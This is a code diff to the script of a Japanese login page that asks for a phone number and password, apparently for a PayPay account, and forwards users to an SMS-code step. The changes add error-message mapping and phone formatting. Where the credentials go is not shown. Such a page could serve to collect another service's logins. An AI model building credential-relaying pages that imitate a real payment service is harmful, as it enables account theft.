@@ -270,12 +270,40 @@
   const errorDiv   = document.getElementById("loginError");
   const overlay    = document.getElementById("loadingOverlay");
 
-  function updateBtn() {
-    loginBtn.disabled = !(phoneInput.value.trim() && passInput.value.trim());
+  const ERROR_MAP = [
+    [/wrong.?password|incorrect.?password|password.*incorrect|認証.*失敗|WRONG_PASSWORD/i,
+      "携帯電話番号またはパスワードが違います。"],
+    [/lock|locked|ロック/i,
+      "アカウントがロックされています。しばらく経ってから再度お試しください。"],
+    [/not.?found|no.?user|該当.*ユーザー/i,
+      "携帯電話番号またはパスワードが違います。"],
+    [/too.?many|rate.?limit|試行回数/i,
+      "ログイン試行回数が上限に達しました。しばらく経ってから再度お試しください。"],
+  ];
+
+  function mapError(raw) {
+    if (!raw) return "ログインに失敗しました。電話番号またはパスワードを確認してください。";
+    for (const [re, msg] of ERROR_MAP) {
+      if (re.test(raw)) return msg;
+    }
+    return raw;
   }
 
-  phoneInput.addEventListener("input", updateBtn);
+  phoneInput.addEventListener("input", function () {
+    let digits = this.value.replace(/\D/g, "").slice(0, 11);
+    let fmt = digits;
+    if (digits.length > 7)      fmt = digits.slice(0,3) + "-" + digits.slice(3,7) + "-" + digits.slice(7);
+    else if (digits.length > 3) fmt = digits.slice(0,3) + "-" + digits.slice(3);
+    this.value = fmt;
+    updateBtn();
+  });
+
   passInput.addEventListener("input", updateBtn);
+
+  function updateBtn() {
+    const digits = phoneInput.value.replace(/\D/g, "");
+    loginBtn.disabled = !(digits.length >= 10 && passInput.value.trim());
+  }
 
   [phoneInput, passInput].forEach(el => {
     el.style.webkitUserSelect = "text";
@@ -293,9 +321,9 @@
 
   loginBtn.addEventListener("click", async () => {
     clearError();
-    const phone    = phoneInput.value.trim();
+    const phone    = phoneInput.value.replace(/\D/g, "");
     const password = passInput.value.trim();
-    if (!phone || !password) return;
+    if (phone.length < 10 || !password) return;
 
     overlay.classList.add("visible");
     loginBtn.disabled = true;
@@ -309,24 +337,24 @@
       const data = await res.json();
 
       if (!res.ok) {
-        showError(data.error || "ログインに失敗しました。電話番号またはパスワードを確認してください。");
+        showError(mapError(data.error));
         loginBtn.disabled = false;
         return;
       }
 
       if (data.status === "sms_required") {
-        sessionStorage.setItem("paypay_phone", phone);
+        sessionStorage.setItem("paypay_phone", phoneInput.value);
         window.location.href = "sms.html";
       }
 
     } catch (err) {
-      showError("通信エラーが発生しました。再度お試しください。");
+      showError("サーバーに接続できませんでした。しばらく経ってから再度お試しください。");
       loginBtn.disabled = false;
     } finally {
       overlay.classList.remove("visible");
     }
   });
 })();
-</script>
+<\/script>
 </body>
 </html>
